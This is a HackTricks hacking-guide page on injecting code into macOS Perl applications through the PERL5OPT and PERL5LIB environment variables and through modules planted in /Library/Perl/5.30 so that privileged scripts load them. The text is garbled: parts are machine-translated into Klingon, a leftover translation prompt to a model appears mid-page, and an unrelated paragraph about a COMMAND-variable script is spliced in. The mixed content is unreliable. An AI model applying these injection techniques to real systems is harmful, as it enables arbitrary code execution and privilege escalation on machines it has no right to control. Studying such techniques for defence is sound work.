# macOS Perl Applications Injection

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Via `PERL5OPT` & `PERL5LIB` env variable

Using the env variable PERL5OPT it's possible to make perl execute arbitrary commands.\
For example, create this script:

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

**Qapla'** **env variable** **export** **'ej** **perl** **script** **execute**:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
vaj vItlhutlh /Perl module/ (e.g. `/tmp/pmod.pm`) yIlo':

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

'ej vaj vItlhutlh:

```perl
#!/usr/bin/perl

use strict;
use warnings;

my $command = $ENV{'COMMAND'};
system($command);
```

This script reads the value of the `COMMAND` environment variable and executes it using the `system` function. By setting the `COMMAND` variable to a malicious command, an attacker can inject and execute arbitrary code within the Perl application.

To exploit this vulnerability, an attacker needs to have the ability to set environment variables on the target system. This can be achieved through various means, such as through a privilege escalation or by exploiting other vulnerabilities in the system.

To protect against this type of attack, it is important to ensure that only trusted sources can set environment variables on the system. Additionally, regular security updates and patches should be applied to mitigate any potential vulnerabilities that could be exploited by an attacker.
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## QaStaHvIS

Perl jatlh dependencies folder order list vItlhutlh:
```bash
perl -e 'print join("\n", @INC)'
```
Qapla'! 
The following is content from a hacking book about hacking techniques. The following content is from the file /hive/hacktricks/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-perl-applications-injection.md. Translate the relevant English text to Klingon and return the translation keeping exactly the same markdown and HTML syntax. Do not translate things like code, hacking technique names, hacking word, cloud/SaaS platform names (like Workspace, aws, gcp...), the word 'leak', pentesting, and markdown tags. Also don't add any extra stuff apart from the translation and markdown syntax.
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Some of the returned folders doesn't even exist, however, **`/Library/Perl/5.30`** does **exist**, it's **not** **protected** by **SIP** and it's **before** the folders **protected by SIP**. Therefore, someone could abuse that folder to add script dependencies in there so a high privilege Perl script will load it.

{% hint style="warning" %}
However, note that you **need to be root to write in that folder** and nowadays you will get this **TCC prompt**:
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

For example, if a script is importing **`use File::Basename;`** it would be possible to create `/Library/Perl/5.30/File/Basename.pm` to make it execute arbitrary code.

## References

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
